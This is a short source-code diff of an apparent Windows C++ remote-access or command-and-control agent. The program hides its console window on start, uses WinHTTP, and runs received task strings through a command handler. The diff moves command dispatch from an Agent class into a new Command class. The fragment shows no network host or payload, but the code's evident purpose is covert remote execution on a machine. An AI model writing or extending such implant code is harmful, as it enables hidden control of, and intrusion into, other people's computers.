@@ -6,15 +6,21 @@
 #include <sstream>
 #include <vector>
 #include <Windows.h>
-#include "Config.h"
-
 #include <WinHttp.h>
+
+
+#include "Config.h"
+#include "Agent.cpp"
+#include "Command.cpp"
+
 #pragma comment(lib, "winhttp.lib")
 
 int main()
 {
 	// Hide console window
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	Agent agent;
+	Command cmdHandler;
 
 	//Agent::Register();
 
@@ -26,8 +32,8 @@ int main()
 			std::vector <std::string> Task = split(task);
 			std::string Command = Task[0];
 
-			if (Agent::HasCommand(Command)) {
-				Agent::RunCommand(Command);
+			if (cmdHandler.HasCommand(Command)) {
+				cmdHandler.ExecuteCommand(Command);
 			}		
 		}
 
